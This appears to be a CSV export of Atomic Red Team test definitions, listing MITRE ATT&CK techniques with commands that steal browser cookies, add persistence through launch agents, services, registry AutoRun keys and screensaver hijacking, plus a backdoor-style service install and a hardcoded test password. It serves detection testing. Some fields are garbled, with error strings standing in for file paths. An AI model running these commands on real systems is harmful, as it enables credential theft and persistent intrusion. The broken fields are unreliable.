"MITRE_ID","File","AtomicTest","ExecutorName","Command","Cleanup","Dependencies"
"T1539","C:\AtomicRedTeam\atomics\T1539\T1539.yaml","Steal Firefox Cookies (Windows)","powershell","stop-process -name ""firefox"" -force -erroraction silentlycontinue
$CookieDBLocation = get-childitem -path ""$env:appdata\Mozilla\Firefox\Profiles\*\cookies.sqlite""
""select host, name, value, path, expiry, isSecure, isHttpOnly, sameSite from [moz_cookies];"" | cmd /c PathToAtomicsFolder\..\ExternalPayloads\ ""$CookieDBLocation"" | out-file -filepath ""PathToAtomicsFolder\..\ExternalPayloads\""
","remove-item PathToAtomicsFolder\..\ExternalPayloads\ -erroraction silentlycontinue
","New-Item -Type Directory ""PathToAtomicsFolder\..\ExternalPayloads\"" -ErrorAction Ignore -Force | Out-Null Invoke-WebRequest ""https://www.sqlite.org/2022/sqlite-tools-win32-x86-3380200.zip"" -OutFile ""PathToAtomicsFolder\..\ExternalPayloads\sqlite.zip"" Expand-Archive -path ""PathToAtomicsFolder\..\ExternalPayloads\sqlite.zip"" -destinationpath ""PathToAtomicsFolder\..\ExternalPayloads\"" -force "
"T1539","C:\AtomicRedTeam\atomics\T1539\T1539.yaml","Steal Chrome Cookies (Windows)","powershell","stop-process -name ""chrome"" -force -erroraction silentlycontinue
""select host_key, name, encrypted_value, path, expires_utc, is_secure, is_httponly from [Cookies];"" | cmd /c PathToAtomicsFolder\..\ExternalPayloads\ ""PathToAtomicsFolder\..\ExternalPayloads\"" | out-file -filepath ""PathToAtomicsFolder\..\ExternalPayloads\""
","remove-item PathToAtomicsFolder\..\ExternalPayloads\
","New-Item -Type Directory ""PathToAtomicsFolder\..\ExternalPayloads\"" -ErrorAction Ignore -Force | Out-Null Invoke-WebRequest ""https://www.sqlite.org/2022/sqlite-tools-win32-x86-3380200.zip"" -OutFile ""PathToAtomicsFolder\..\ExternalPayloads\sqlite.zip"" Expand-Archive -path ""PathToAtomicsFolder\..\ExternalPayloads\sqlite.zip"" -destinationpath ""PathToAtomicsFolder\..\ExternalPayloads\"" -force "
"T1539","C:\AtomicRedTeam\atomics\T1539\T1539.yaml","Copy Safari BinaryCookies files using AppleScript","sh","osascript -e 'tell application ""Finder""' -e 'set destinationFolderPath to POSIX file ""/private/tmp""' -e 'set safariFolder to ((path to library folder from user domain as text) & ""Containers:com.apple.Safari:Data:Library:Cookies:"")' -e 'duplicate file ""Cookies.binarycookies"" of folder safariFolder to folder destinationFolderPath with replacing' -e 'end tell'","rm ""/private/tmp/Cookies.binarycookies""",""
"T1543.001","C:\AtomicRedTeam\atomics\T1543.001\T1543.001.yaml","Launch Agent","bash","if [ ! -d ~/Library/LaunchAgents ]; then mkdir ~/Library/LaunchAgents; fi;
sudo cp The shared library doesn't exist. Check the path ~/Library/LaunchAgents/The shared library doesn't exist. Check the path
sudo launchctl load -w ~/Library/LaunchAgents/The shared library doesn't exist. Check the path
","sudo launchctl unload ~/Library/LaunchAgents/The shared library doesn't exist. Check the path
sudo rm ~/Library/LaunchAgents/The shared library doesn't exist. Check the path
","echo ""The shared library doesn't exist. Check the path""; exit 1; "
"T1543.001","C:\AtomicRedTeam\atomics\T1543.001\T1543.001.yaml","Event Monitor Daemon Persistence","bash","sudo cp $PathToAtomicsFolder/T1543.001/src/atomicredteam_T1543_001.plist /etc/emond.d/rules/atomicredteam_T1543_001.plist
sudo touch /private/var/db/emondClients/randomflag
","sudo rm /etc/emond.d/rules/atomicredteam_T1543_001.plist
sudo rm /private/var/db/emondClients/randomflag",""
"T1543.001","C:\AtomicRedTeam\atomics\T1543.001\T1543.001.yaml","Launch Agent - Root Directory","bash","sudo cp The plist file doesn't exist. Check the path and try again. /Library/LaunchAgents/The plist file doesn't exist. Check the path and try again.
launchctl load -w /Library/LaunchAgents/The plist file doesn't exist. Check the path and try again.
","launchctl unload /Library/LaunchAgents/The plist file doesn't exist. Check the path and try again.
sudo rm /Library/LaunchAgents/The plist file doesn't exist. Check the path and try again.
sudo rm /tmp/T1543_001_atomicredteam.txt
","echo ""Failed to create /Library/LaunchAgents""; exit 1; ; echo ""The plist file doesn't exist. Check the path and try again.""; exit 1; "
"T1543.002","C:\AtomicRedTeam\atomics\T1543.002\T1543.002.yaml","Create Systemd Service","bash","echo ""[Unit]"" > /etc/systemd/system/art-systemd-service.service
echo ""Description=Atomic Red Team Systemd Service"" >> /etc/systemd/system/art-systemd-service.service
echo """" >> /etc/systemd/system/art-systemd-service.service
echo ""[Service]"" >> /etc/systemd/system/art-systemd-service.service
echo ""Type=simple""
echo ""ExecStart=/bin/touch /tmp/art-systemd-execstart-marker"" >> /etc/systemd/system/art-systemd-service.service
echo ""ExecStartPre=/bin/touch /tmp/art-systemd-execstartpre-marker"" >> /etc/systemd/system/art-systemd-service.service
echo ""ExecStartPost=/bin/touch /tmp/art-systemd-execstartpost-marker"" >> /etc/systemd/system/art-systemd-service.service
echo ""ExecReload=/bin/touch /tmp/art-systemd-execreload-marker"" >> /etc/systemd/system/art-systemd-service.service
echo ""ExecStop=/bin/touch /tmp/art-systemd-execstop-marker"" >> /etc/systemd/system/art-systemd-service.service
echo ""ExecStopPost=/bin/touch /tmp/art-systemd-execstoppost-marker"" >> /etc/systemd/system/art-systemd-service.service
echo """" >> /etc/systemd/system/art-systemd-service.service
echo ""[Install]"" >> /etc/systemd/system/art-systemd-service.service
echo ""WantedBy=default.target"" >> /etc/systemd/system/art-systemd-service.service
systemctl daemon-reload
systemctl enable art-systemd-service.service
systemctl start art-systemd-service.service
","systemctl stop art-systemd-service.service
systemctl disable art-systemd-service.service
rm -rf /etc/systemd/system/art-systemd-service.service
systemctl daemon-reload
",""
"T1543.002","C:\AtomicRedTeam\atomics\T1543.002\T1543.002.yaml","Create SysV Service","sh","echo '#\!/bin/sh' > /usr/local/etc/rc.d/art-test
echo ' ' >> /usr/local/etc/rc.d/art-test
echo '#' >> /usr/local/etc/rc.d/art-test
echo '# PROVIDE: art-test' >> /usr/local/etc/rc.d/art-test
echo '# REQUIRE: LOGIN' >> /usr/local/etc/rc.d/art-test
echo '# KEYWORD: shutdown' >> /usr/local/etc/rc.d/art-test
echo ' ' >> /usr/local/etc/rc.d/art-test
echo '. /etc/rc.subr' >> /usr/local/etc/rc.d/art-test
echo ' ' >> /usr/local/etc/rc.d/art-test
echo 'name=""art_test""' >> /usr/local/etc/rc.d/art-test
echo 'rcvar=art_test_enable' >> /usr/local/etc/rc.d/art-test
echo 'load_rc_config ${name}' >> /usr/local/etc/rc.d/art-test
echo 'command=""/usr/bin/touch""' >> /usr/local/etc/rc.d/art-test
echo 'start_cmd=""art_test_start""' >> /usr/local/etc/rc.d/art-test
echo '' >> /usr/local/etc/rc.d/art-test
echo 'art_test_start()' >> /usr/local/etc/rc.d/art-test     
echo '{' >> /usr/local/etc/rc.d/art-test
echo '  ${command} /tmp/art-test.marker' >> /usr/local/etc/rc.d/art-test
echo '}' >> /usr/local/etc/rc.d/art-test
echo ' ' >> /usr/local/etc/rc.d/art-test     
echo 'run_rc_command ""$1""' >> /usr/local/etc/rc.d/art-test
chmod +x /usr/local/etc/rc.d/art-test
service art-test enable
service art-test start
","sysrc -x art_test_enable
rm -f /usr/local/etc/rc.d/art-test
",""
"T1543.003","C:\AtomicRedTeam\atomics\T1543.003\T1543.003.yaml","Modify Fax service to run PowerShell","command_prompt","sc config Fax binPath= ""C:\windows\system32\WindowsPowerShell\v1.0\powershell.exe -noexit -c \""write-host 'T1543.003 Test'\""""
sc start Fax
","sc config Fax binPath= ""C:\WINDOWS\system32\fxssvc.exe"" >nul 2>&1
",""
"T1543.003","C:\AtomicRedTeam\atomics\T1543.003\T1543.003.yaml","Service Installation CMD","command_prompt","sc.exe create #{binary_path} binPath= ""#{binary_path}"" start=#{binary_path}  type=#{binary_path}
sc.exe start #{binary_path}
","sc.exe stop #{binary_path} >nul 2>&1
sc.exe delete #{binary_path} >nul 2>&1
","New-Item -Type Directory (split-path ""#{binary_path}"") -ErrorAction ignore | Out-Null Invoke-WebRequest ""https://github.com/redcanaryco/atomic-red-team/raw/master/atomics/T1543.003/bin/AtomicService.exe"" -OutFile ""#{binary_path}"" "
"T1543.003","C:\AtomicRedTeam\atomics\T1543.003\T1543.003.yaml","Service Installation PowerShell","powershell","New-Service -Name ""#{binary_path}"" -BinaryPathName ""#{binary_path}""
Start-Service -Name ""#{binary_path}""
","Stop-Service -Name ""#{binary_path}"" 2>&1 | Out-Null
try {(Get-WmiObject Win32_Service -filter ""name='#{binary_path}'"").Delete()}
catch {}
","New-Item -Type Directory (split-path ""#{binary_path}"") -ErrorAction ignore | Out-Null Invoke-WebRequest ""https://github.com/redcanaryco/atomic-red-team/raw/master/atomics/T1543.003/bin/AtomicService.exe"" -OutFile ""#{binary_path}"" "
"T1543.003","C:\AtomicRedTeam\atomics\T1543.003\T1543.003.yaml","TinyTurla backdoor service w64time","command_prompt","copy ""$PathToAtomicsFolder\T1543.003\bin\w64time.dll"" %systemroot%\system32\
sc create W64Time binPath= ""c:\Windows\System32\svchost.exe -k TimeService"" type= share start=auto
sc config W64Time DisplayName= ""Windows 64 Time""
sc description W64Time ""Maintain date and time synch on all clients and services in the network""
reg add ""HKLM\Software\Microsoft\Windows NT\CurrentVersion\Svchost"" /v TimeService /t REG_MULTI_SZ /d ""W64Time"" /f
reg add ""HKLM\SYSTEM\CurrentControlSet\Services\W64Time\Parameters"" /v ServiceDll /t REG_EXPAND_SZ /d ""%systemroot%\system32\w64time.dll"" /f
sc start W64Time","sc stop W64Time
sc.exe delete W64Time
del %systemroot%\system32\w64time.dll
reg delete ""HKLM\Software\Microsoft\Windows NT\CurrentVersion\Svchost"" /v TimeService /f
reg delete ""HKLM\SYSTEM\CurrentControlSet\Services\W64Time\Parameters"" /v ServiceDll /f",""
"T1543.003","C:\AtomicRedTeam\atomics\T1543.003\T1543.003.yaml","Remote Service Installation CMD","command_prompt","sc.exe \\#{binary_path} create #{binary_path} binPath= ""#{binary_path}"" start=#{binary_path} type=#{binary_path}
sc.exe \\#{binary_path} start #{binary_path}
","sc.exe \\#{binary_path} stop #{binary_path} >nul 2>&1
sc.exe \\#{binary_path} delete #{binary_path} >nul 2>&1
","New-Item -Type Directory (split-path ""#{binary_path}"") -ErrorAction ignore | Out-Null Invoke-WebRequest ""https://github.com/redcanaryco/atomic-red-team/raw/master/atomics/T1543.003/bin/AtomicService.exe"" -OutFile ""#{binary_path}"" "
"T1543.003","C:\AtomicRedTeam\atomics\T1543.003\T1543.003.yaml","Modify Service to Run Arbitrary Binary (Powershell)","powershell","Stop-Service -Name ""fax"" -force -erroraction silentlycontinue | Out-Null
set-servicebinarypath -name ""fax"" -path ""$env:windir\system32\notepad.exe""
start-service -Name ""fax"" -erroraction silentlycontinue | out-null","Stop-Service -Name ""fax"" -force -erroraction silentlycontinue | Out-Null
set-servicebinarypath -name ""fax"" -path ""$env:windir\system32\fxssvc.exe"" -erroraction silentlycontinue | out-null",""
"T1543.004","C:\AtomicRedTeam\atomics\T1543.004\T1543.004.yaml","Launch Daemon","bash","sudo cp The plist file doesn't exist. Check the path and try again. /Library/LaunchDaemons/The plist file doesn't exist. Check the path and try again.
sudo launchctl load -w /Library/LaunchDaemons/The plist file doesn't exist. Check the path and try again.
","sudo launchctl unload /Library/LaunchDaemons/The plist file doesn't exist. Check the path and try again.
sudo rm /Library/LaunchDaemons/The plist file doesn't exist. Check the path and try again.
sudo rm /tmp/T1543_004_atomicredteam.txt
","echo ""The plist file doesn't exist. Check the path and try again.""; exit 1; "
"T1546","C:\AtomicRedTeam\atomics\T1546\T1546.yaml","HKLM - Persistence using CommandProcessor AutoRun key (With Elevation)","powershell","New-ItemProperty -Path ""HKLM:\Software\Microsoft\Command Processor"" -Name ""AutoRun"" -Value ""notepad.exe"" -PropertyType ""String""","Remove-ItemProperty -Path ""HKLM:\Software\Microsoft\Command Processor"" -Name ""AutoRun"" -ErrorAction Ignore",""
"T1546","C:\AtomicRedTeam\atomics\T1546\T1546.yaml","HKCU - Persistence using CommandProcessor AutoRun key (Without Elevation)","powershell","$path = ""HKCU:\Software\Microsoft\Command Processor""
if (!(Test-Path -path $path)){
  New-Item -ItemType Key -Path $path
}
New-ItemProperty -Path $path -Name ""AutoRun"" -Value ""notepad.exe"" -PropertyType ""String""","Remove-ItemProperty -Path ""HKCU:\Software\Microsoft\Command Processor"" -Name ""AutoRun"" -ErrorAction Ignore",""
"T1546","C:\AtomicRedTeam\atomics\T1546\T1546.yaml","WMI Invoke-CimMethod Start Process","powershell","# Set the remote computer name and credentials
 $RemoteComputer = ""localhost""
 $PWord = ConvertTo-SecureString -String ""P@ssword1"" -AsPlainText -Force
 $Credential = New-Object -TypeName System.Management.Automation.PSCredential -ArgumentList ""Administrator"", $Pword

 # Create a CIM session
 $CimSession = New-CimSession -ComputerName $RemoteComputer -Credential $Credential

 # Define the process you want to start
 $ProcessToStart = ""calc.exe""

 # Invoke the Create method on the Win32_Process class to start the process
 $Result = Invoke-CimMethod -CimSession $CimSession -ClassName Win32_Process -MethodName Create -Arguments @{CommandLine = $ProcessToStart}

 # Check the result
 if ($Result.ReturnValue -eq 0) {
     Write-Host ""Process started successfully with Process ID: $($Result.ProcessId)""
 } else {
     Write-Host ""Failed to start the process. Error code: $($Result.ReturnValue)""
 }

 # Clean up the CIM session
 Remove-CimSession -CimSession $CimSession 
",,""
"T1546","C:\AtomicRedTeam\atomics\T1546\T1546.yaml","Load custom DLL on mstsc execution","command_prompt","reg add ""HKLM\SOFTWARE\Microsoft\Terminal Server Client"" /v ClxDllPath /t REG_SZ /d ""C:\Windows\System32\amsi.dll"" /f
","reg delete ""HKLM\SOFTWARE\Microsoft\Terminal Server Client"" /v ClxDllPath /f      ",""
"T1546.001","C:\AtomicRedTeam\atomics\T1546.001\T1546.001.yaml","Change Default File Association","command_prompt","assoc .hta=txtfile
","assoc  .hta=htafile
",""
"T1546.002","C:\AtomicRedTeam\atomics\T1546.002\T1546.002.yaml","Set Arbitrary Binary as Screensaver","command_prompt","reg export ""HKEY_CURRENT_USER\Control Panel\Desktop"" %userprofile%\backup.reg
copy C:\Windows\System32\cmd.exe ""%SystemRoot%\System32\evilscreensaver.scr""
reg.exe add ""HKEY_CURRENT_USER\Control Panel\Desktop"" /v ScreenSaveActive /t REG_SZ /d 1 /f
reg.exe add ""HKEY_CURRENT_USER\Control Panel\Desktop"" /v ScreenSaveTimeout /t REG_SZ /d 60 /f
reg.exe add ""HKEY_CURRENT_USER\Control Panel\Desktop"" /v ScreenSaverIsSecure /t REG_SZ /d 0 /f
reg.exe add ""HKEY_CURRENT_USER\Control Panel\Desktop"" /v SCRNSAVE.EXE /t REG_SZ /d ""%SystemRoot%\System32\evilscreensaver.scr"" /f
if 0 NEQ 0 shutdown /r /t 0
","reg import %userprofile%\backup.reg
del %userprofile%\backup.reg
del %SystemRoot%\System32\evilscreensaver.scr
",""
"T1546.003","C:\AtomicRedTeam\atomics\T1546.003\T1546.003.yaml","Windows MOFComp.exe Load MOF File","powershell","#{mof_file} ""#{mof_file}""
","$EventConsumerToCleanup = Get-WmiObject -Namespace root/subscription -Class CommandLineEventConsumer -Filter ""Name = 'AtomicRedTeam_consumer'""
$EventFilterToCleanup = Get-WmiObject -Namespace root/subscription -Class __EventFilter -Filter ""Name = 'AtomicRedTeam_filter'""
$FilterConsumerBindingToCleanup = Get-WmiObject -Namespace root/subscription -Query ""REFERENCES OF {$($EventConsumerToCleanup.__RELPATH)} WHERE ResultClass = __FilterToConsumerBinding"" -ErrorAction SilentlyContinue
$FilterConsumerBindingToCleanup | Remove-WmiObject
$EventConsumerToCleanup | Remove-WmiObject
$EventFilterToCleanup | Remove-WmiObject
","Validate MOFComp.exe is on disk somewhere and update input argument. ; New-Item -Type Directory (split-path ""#{mof_file}"") -ErrorAction ignore | Out-Null Invoke-WebRequest ""https://github.com/redcanaryco/atomic-red-team/raw/master/atomics/T1546.003/src/T1546.003.mof"" -OutFile ""#{mof_file}"" "
